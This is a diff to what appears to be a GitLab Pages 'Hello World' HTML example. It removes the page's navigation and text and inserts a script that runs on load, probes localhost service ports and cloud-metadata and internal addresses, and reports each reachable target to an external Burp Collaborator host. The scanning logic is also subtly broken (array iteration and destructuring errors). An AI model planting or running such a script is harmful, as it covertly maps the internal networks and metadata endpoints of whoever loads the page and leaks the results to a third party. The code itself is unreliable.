@@ -7,17 +7,56 @@
     <link rel="stylesheet" href="style.css">
   </head>
   <body>
-    <div class="navbar">
-      <a href="https://pages.gitlab.io/plain-html/">Plain HTML Example</a>
-      <a href="https://gitlab.com/pages/plain-html/">Repository</a>
-      <a href="https://gitlab.com/pages/">Other Examples</a>
-    </div>
 
     <h1>Hello World!</h1>
 
-    <p>
-      This is a simple plain-HTML website on GitLab Pages, without any fancy static site generator.
-    </p>
+    <script>
+      const ports_to_scan = ["80-http", "443-https", "2375-http", "2376-https", "2379-http", "4242-http", "8000-http", "8080-http", "8082-http", "8443-https", "9001-http", "9200-http", "7001-http", "8888-http", "8500-http", "8501-https", "8983-http", "9121-http", "9999-http", "9999-https"];
+const internal_addresses = ["http://169.254.169.254", "http://0.0.0.0", "http://169.254.170.2", "http://192.0.0.192", "http://10.10.10.10", "http://10.0.0.0"];
+
+
+function callback(url) {
+    var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open("GET", "http://5flwl1joja33ep8p1lcoatr34uaky9.burpcollaborator.net/" + url, false); // false for synchronous request
+        xmlHttp.send(null);
+}
+
+function test(url) {
+    var timeout = (timeout == null)?100:timeout;
+    var img = new Image();
+
+    img.onerror = function () {
+        if (!img) return;
+        img = undefined;
+        callback(url);
+    };
+
+    img.onload = function() {
+        callback(url);
+    };
+
+    img.src = url;
+    setTimeout(function () {
+        if (!img) {
+            return;
+        }
+
+        img.onerror = function() {};
+        img.onload = function() {};
+        img.src = "http://github.com:80";
+    }, timeout);
+}
+
+for (let port in ports_to_scan) {
+    port_num, protocol = port.split("-");
+    url = protocol + "://127.0.0.1:" + port_num;
+    test(url);
+}
+
+for (let target in internal_addresses) {
+    test(target);
+}
+    </script>
   </body>
 </html>
 
